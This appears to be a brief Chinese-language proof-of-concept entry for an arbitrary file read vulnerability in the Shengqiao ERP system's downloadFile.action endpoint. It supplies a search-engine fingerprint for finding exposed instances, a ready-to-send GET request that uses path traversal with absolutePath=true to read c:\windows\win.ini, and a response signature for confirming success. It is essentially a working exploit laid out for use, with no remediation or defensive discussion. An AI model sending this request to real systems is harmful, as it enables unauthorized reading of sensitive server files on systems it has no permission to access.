# 圣乔ERP系统downloadFile存在任意文件读取漏洞

圣乔ERP系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="圣乔-ERP系统"`
- **请求**：`GET /erp/wap/../downloadFile.action?absolutePath=true&file=c:\\windows\win.ini HTTP/1.1`
- **响应特征**：200 [Mail]